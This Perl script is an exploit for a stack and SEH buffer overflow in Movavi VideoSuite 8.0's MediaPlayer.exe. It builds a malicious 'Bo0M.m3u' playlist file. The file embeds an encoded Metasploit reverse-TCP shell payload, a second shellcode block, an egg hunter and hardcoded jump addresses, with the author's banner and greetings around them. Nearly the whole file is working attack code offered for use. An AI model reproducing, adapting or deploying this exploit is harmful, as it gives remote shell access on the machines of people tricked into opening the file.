#!/usr/bin/perl

###
# Title : Movavi VideoSuite 8.0 (MediaPlayer.exe) Buffer Overflow
# Author : KedAns-Dz
# E-mail : ked-h@hotmail.com
# Home : HMD/AM (30008/04300) - Algeria -(00213555248701)
# Twitter page : twitter.com/kedans
# platform : Windows
# Impact : Remote Access and BOF
# Tested on : Windows XP SP3 Fran�ais 
# Target :  Movavi Video Suite 8.0
###
# >>>>>> BAC 2011 Enchallah ( Me & BadR0 & Dr.Ride & Red1One & XoreR & Fox-Dz ... all )
# ------------
# Note : This Exploit BOF is Special Greets to Member ' Overfolw3r ' From sec4ever.com
# ------------
# => start Movavi_VideoSuite_8.0 >> MediaPlayer.exe >> < Open TheEvil m3u File Here
# or ...\..\etc\Movavi Video Suite 8\MediaPlayer.exe << Open The Evil m3u File Here
# ------------
#START SYSTEM /root@MSdos/ : 
system("title KedAns-Dz");
system("color 1e");
system("cls");
print "\n\n";
print "    |===========================================================|\n";
print "    |= [!] Name : Movavi_VideoSuite_8 (MediaPlayer.exe)        =|\n";
print "    |= [!] Exploit : Stack Buffer Overflow                     =|\n";
print "    |= [!] Author : KedAns-Dz                                  =|\n";
print "    |= [!] Mail: Ked-h(at)hotmail(dot)com                      =|\n";
print "    |===========================================================|\n";
sleep(2);
print "\n";
print " [!] Please Wait Loading...\n";
# Payload Parameter (http://www.metasploit.com) 
# windows/shell_reverse_tcp - 739 bytes
# Encoder: x86/alpha_mixed
# LHOST=127.0.0.1, LPORT=4444, ReverseConnectRetries=5, =>
my $payload = 
"\x56\x54\x58\x36\x33\x30\x56\x58\x48\x34\x39\x48\x48\x48" .
"\x50\x68\x59\x41\x41\x51\x68\x5a\x59\x59\x59\x59\x41\x41" .
"\x51\x51\x44\x44\x44\x64\x33\x36\x46\x46\x46\x46\x54\x58" .
"\x56\x6a\x30\x50\x50\x54\x55\x50\x50\x61\x33\x30\x31\x30" .
"\x38\x39\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49" .
"\x49\x49\x49\x49\x49\x37\x51\x5a\x6a\x41\x58\x50\x30\x41" .
"\x30\x41\x6b\x41\x41\x51\x32\x41\x42\x32\x42\x42\x30\x42" .
"\x42\x41\x42\x58\x50\x38\x41\x42\x75\x4a\x49\x4b\x4c\x4d" .
"\x38\x4e\x69\x47\x70\x43\x30\x45\x50\x45\x30\x4d\x59\x4a" .
"\x45\x45\x61\x48\x52\x43\x54\x4e\x6b\x50\x52\x50\x30\x4c" .
"\x4b\x51\x42\x46\x6c\x4e\x6b\x46\x32\x46\x74\x4c\x4b\x50" .
"\x72\x46\x48\x46\x6f\x4f\x47\x43\x7a\x51\x36\x46\x51\x49" .
"\x6f\x46\x51\x4f\x30\x4e\x4c\x47\x4c\x43\x51\x43\x4c\x43" .
"\x32\x44\x6c\x47\x50\x4f\x31\x48\x4f\x46\x6d\x43\x31\x49" .
"\x57\x48\x62\x4c\x30\x51\x42\x42\x77\x4c\x4b\x50\x52\x42" .
"\x30\x4c\x4b\x43\x72\x45\x6c\x46\x61\x4a\x70\x4c\x4b\x43" .
"\x70\x43\x48\x4e\x65\x4b\x70\x42\x54\x50\x4a\x45\x51\x48" .
"\x50\x46\x30\x4e\x6b\x50\x48\x45\x48\x4e\x6b\x51\x48\x51" .
"\x30\x45\x51\x48\x53\x48\x63\x47\x4c\x43\x79\x4e\x6b\x47" .
"\x44\x4e\x6b\x46\x61\x4b\x66\x50\x31\x4b\x4f\x44\x71\x4f" .
"\x30\x4e\x4c\x49\x51\x4a\x6f\x46\x6d\x46\x61\x4f\x37\x46" .
"\x58\x4d\x30\x42\x55\x4a\x54\x46\x63\x43\x4d\x4c\x38\x47" .
"\x4b\x51\x6d\x44\x64\x44\x35\x49\x72\x43\x68\x4c\x4b\x50" .
"\x58\x45\x74\x47\x71\x48\x53\x51\x76\x4e\x6b\x46\x6c\x42" .
"\x6b\x4c\x4b\x42\x78\x47\x6c\x45\x51\x48\x53\x4e\x6b\x45" .
"\x54\x4c\x4b\x47\x71\x48\x50\x4f\x79\x42\x64\x44\x64\x47" .
"\x54\x51\x4b\x51\x4b\x43\x51\x50\x59\x43\x6a\x46\x31\x4b" .
"\x4f\x4d\x30\x50\x58\x43\x6f\x43\x6a\x4c\x4b\x45\x42\x48" .
"\x6b\x4e\x66\x43\x6d\x42\x48\x50\x33\x44\x72\x45\x50\x43" .
"\x30\x51\x78\x42\x57\x42\x53\x46\x52\x43\x6f\x50\x54\x43" .
"\x58\x42\x6c\x44\x37\x44\x66\x45\x57\x49\x6f\x48\x55\x48" .
"\x38\x4c\x50\x47\x71\x45\x50\x47\x70\x47\x59\x4b\x74\x51" .
"\x44\x42\x70\x42\x48\x44\x69\x4d\x50\x42\x4b\x43\x30\x49" .
"\x6f\x48\x55\x50\x50\x42\x70\x50\x50\x42\x70\x47\x30\x42" .
"\x70\x43\x70\x50\x50\x43\x58\x48\x6a\x44\x4f\x49\x4f\x4d" .
"\x30\x49\x6f\x4b\x65\x4e\x69\x48\x47\x42\x48\x43\x4f\x45" .
"\x50\x43\x30\x47\x71\x43\x58\x43\x32\x45\x50\x44\x51\x43" .
"\x6c\x4e\x69\x4a\x46\x51\x7a\x42\x30\x51\x46\x43\x67\x42" .
"\x48\x4d\x49\x4e\x45\x51\x64\x51\x71\x49\x6f\x4e\x35\x50" .
"\x68\x42\x43\x42\x4d\x42\x44\x47\x70\x4c\x49\x48\x63\x51" .
"\x47\x51\x47\x51\x47\x50\x31\x4b\x46\x51\x7a\x47\x62\x51" .
"\x49\x50\x56\x4d\x32\x49\x6d\x50\x66\x4f\x37\x42\x64\x46" .
"\x44\x45\x6c\x47\x71\x43\x31\x4c\x4d\x50\x44\x51\x34\x42" .
"\x30\x4a\x66\x43\x30\x43\x74\x50\x54\x42\x70\x43\x66\x43" .
"\x66\x51\x46\x47\x36\x46\x36\x42\x6e\x50\x56\x46\x36\x42" .
"\x73\x43\x66\x50\x68\x44\x39\x48\x4c\x47\x4f\x4b\x36\x4b" .
"\x4f\x48\x55\x4c\x49\x4b\x50\x50\x4e\x42\x76\x43\x76\x49" .
"\x6f\x50\x30\x42\x48\x43\x38\x4c\x47\x47\x6d\x43\x50\x49" .
"\x6f\x4e\x35\x4f\x4b\x4a\x50\x4d\x65\x4d\x72\x51\x46\x51" .
"\x78\x4d\x76\x4e\x75\x4f\x4d\x4d\x4d\x4b\x4f\x48\x55\x47" .
"\x4c\x46\x66\x43\x4c\x45\x5a\x4b\x30\x49\x6b\x49\x70\x43" .
"\x45\x45\x55\x4d\x6b\x51\x57\x44\x53\x43\x42\x42\x4f\x51" .
"\x7a\x47\x70\x46\x33\x4b\x4f\x49\x45\x41\x41"; #_ End Payload _
# Parameter OverFlow => 
my $eip = pack('V',0x7C86467B); # Jump ESP from kernel32.dll
my $usmh = "\x90" x (50 - length($eip)); # Pack Length x 50
my $ret = pack('V',0x000c04e4); # Jump to ESP from MediaPlayerFR.dll
$junk = "\x41" x 333 ; # Junk
$ksh =  # <----  K.Sh --
"\xeb\x03\x59\xeb\x05\xe8\xf8\xff\xff\xff\x49\x49\x49\x37\x49\x49".
"\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x49\x51\x5a\x6a\x47".
"\x58\x30\x42\x31\x50\x41\x42\x6b\x42\x41\x57\x42\x32\x42\x41\x32".
"\x41\x41\x30\x41\x41\x58\x50\x38\x42\x42\x75\x4d\x39\x49\x6c\x33".
"\x5a\x48\x6b\x42\x6d\x38\x68\x5a\x59\x6b\x4f\x49\x6f\x4b\x4f\x63".
"\x50\x6c\x4b\x30\x6c\x64\x64\x64\x64\x6c\x4b\x50\x45\x67\x4c\x4c".
"\x4b\x51\x6c\x37\x75\x61\x68\x76\x61\x58\x6f\x4e\x6b\x52\x6f\x72".
"\x38\x4c\x4b\x73\x6f\x45\x70\x43\x31\x68\x6b\x31\x59\x4c\x4b\x70".
"\x34\x4c\x4b\x57\x71\x7a\x4e\x34\x71\x4f\x30\x6e\x79\x6c\x6c\x6b".
"\x34\x6f\x30\x43\x44\x33\x37\x6b\x71\x69\x5a\x76\x6d\x53\x31\x49".
"\x52\x5a\x4b\x4c\x34\x45\x6b\x52\x74\x41\x34\x54\x68\x50\x75\x38".
"\x65\x6c\x4b\x63\x6f\x54\x64\x53\x31\x38\x6b\x43\x56\x4e\x6b\x36".
"\x6c\x72\x6b\x4e\x6b\x53\x6f\x75\x4c\x34\x41\x78\x6b\x64\x43\x64".
"\x6c\x6e\x6b\x4b\x39\x50\x6c\x41\x34\x65\x4c\x52\x41\x7a\x63\x64".
"\x71\x69\x4b\x51\x74\x6e\x6b\x71\x53\x66\x50\x4c\x4b\x77\x30\x74".
"\x4c\x6c\x4b\x74\x30\x45\x4c\x4c\x6d\x6e\x6b\x43\x70\x33\x38\x73".
"\x6e\x53\x58\x4c\x4e\x50\x4e\x64\x4e\x38\x6c\x46\x30\x6b\x4f\x4e".
"\x36\x65\x36\x61\x43\x63\x56\x33\x58\x36\x53\x34\x72\x71\x78\x44".
"\x37\x34\x33\x46\x52\x41\x4f\x42\x74\x6b\x4f\x48\x50\x65\x38\x5a".
"\x6b\x7a\x4d\x39\x6c\x45\x6b\x52\x70\x4b\x4f\x6a\x76\x71\x4f\x4e".
"\x69\x6d\x35\x50\x66\x6d\x51\x7a\x4d\x63\x38\x33\x32\x32\x75\x50".
"\x6a\x43\x32\x79\x6f\x38\x50\x45\x38\x68\x59\x73\x39\x4c\x35\x4e".
"\x4d\x56\x37\x6b\x4f\x6a\x76\x76\x33\x30\x53\x71\x43\x76\x33\x71".
"\x43\x41\x53\x76\x33\x73\x73\x71\x43\x6b\x4f\x4e\x30\x71\x76\x31".
"\x78\x37\x61\x41\x4c\x70\x66\x46\x33\x4b\x39\x48\x61\x6d\x45\x70".
"\x68\x39\x34\x57\x6a\x30\x70\x4b\x77\x72\x77\x6b\x4f\x78\x56\x31".
"\x7a\x46\x70\x61\x41\x63\x65\x6b\x4f\x4e\x30\x35\x38\x6c\x64\x6c".
"\x6d\x36\x4e\x6d\x39\x46\x37\x6b\x4f\x5a\x76\x42\x73\x71\x45\x59".
"\x6f\x68\x50\x75\x38\x6b\x55\x37\x39\x6c\x46\x67\x39\x46\x37\x69".
"\x6f\x4a\x76\x70\x50\x73\x64\x46\x34\x61\x45\x6b\x4f\x78\x50\x6d".
"\x43\x42\x48\x6b\x57\x54\x39\x6b\x76\x50\x79\x50\x57\x6b\x4f\x48".
"\x56\x70\x55\x49\x6f\x6a\x70\x45\x36\x41\x7a\x73\x54\x75\x36\x62".
"\x48\x65\x33\x30\x6d\x6e\x69\x7a\x45\x30\x6a\x52\x70\x63\x69\x75".
"\x79\x48\x4c\x4f\x79\x6d\x37\x71\x7a\x57\x34\x6e\x69\x58\x62\x67".
"\x41\x6b\x70\x69\x63\x6e\x4a\x4b\x4e\x77\x32\x66\x4d\x6b\x4e\x41".
"\x52\x66\x4c\x5a\x33\x6c\x4d\x51\x6a\x66\x58\x6e\x4b\x4c\x6b\x4e".
"\x4b\x42\x48\x70\x72\x69\x6e\x78\x33\x67\x66\x6b\x4f\x70\x75\x67".
"\x34\x4b\x4f\x4e\x36\x33\x6b\x70\x57\x56\x32\x50\x51\x46\x31\x46".
"\x31\x41\x7a\x54\x41\x30\x51\x41\x41\x66\x35\x30\x51\x69\x6f\x4e".
"\x30\x50\x68\x6c\x6d\x5a\x79\x77\x75\x4a\x6e\x52\x73\x39\x6f\x58".
"\x56\x30\x6a\x4b\x4f\x6b\x4f\x50\x37\x59\x6f\x6e\x30\x6c\x4b\x36".
"\x37\x79\x6c\x6d\x53\x78\x44\x31\x74\x4b\x4f\x6b\x66\x30\x52\x69".
"\x6f\x6e\x30\x65\x38\x6a\x50\x6e\x6a\x76\x64\x73\x6f\x63\x63\x49".
"\x6f\x4b\x66\x69\x6f\x4e\x30\x47"; # ///
# ----/>
$edh ="PPYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAI".
"AJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JB1V3Q7ZKOLO".
"0B0R1ZKR0X8MNNOLKU0Z2TJO6X2W00002T4KJZ6O2U9Z6O2U9WKO9WKPA"; # /
# < | ! | ---
$nh = "\x61".
"\x6e";
$seh = "\x7b\x41" ; # Open SEH
$prp = "\x6e".
"\x05\x14\x11".
"\x6e".
"\x2d\x13\x11".
"\x6e";
$jmp = "\x50".
"\x6e".
"\xc3";
$alg = "D" x 112;
$psh = "D" x 500;
$ed = "w00tw00t";
# --- | ! | >
# immiXing Parameters >>>
$kedans = $junk.$nh.$seh.$prp.$jmp.$alg.$edh.$psh.$ed.$ksh.$usmh.$ret.$payload ; # Evil KedAns
# >> Creating ... 
open (FILE ,"> Bo0M.m3u");
print FILE $kedans ;
print "\nFile successfully created!\n" or die print "\n OpsS! File is Not Created !! ";
close (FILE);
#================[ Exploited By KedAns-Dz * HST-Dz * ]=========================
# GreetZ to : Islampard * Dr.Ride * Zaki.Eng * BadR0 * NoRo FouinY * Red1One
# XoreR * Mr.Dak007 * Hani * TOnyXED * Fox-Dz * Massinhou-Dz ++ all my friends ;
# > Algerians <  [D] HaCkerS-StreeT-Team [Z] > Hackers <
# My Friends on Facebook : Nayla Festa * Dz_GadlOl * MatmouR13 ...all Others
# 4nahdha.com : TitO (Dr.Ride) *  MEN_dz * Mr.LAK (Administrator) * all members ...
# sec4ever.com members Dz : =>>
#  Ma3sTr0-Dz * Indoushka * MadjiX * BrOx-Dz * JaGo-Dz ... all Others
# hotturks.org : TeX * KadaVra ... all Others
# Kelvin.Xgr ( kelvinx.net)
#===========================================================================
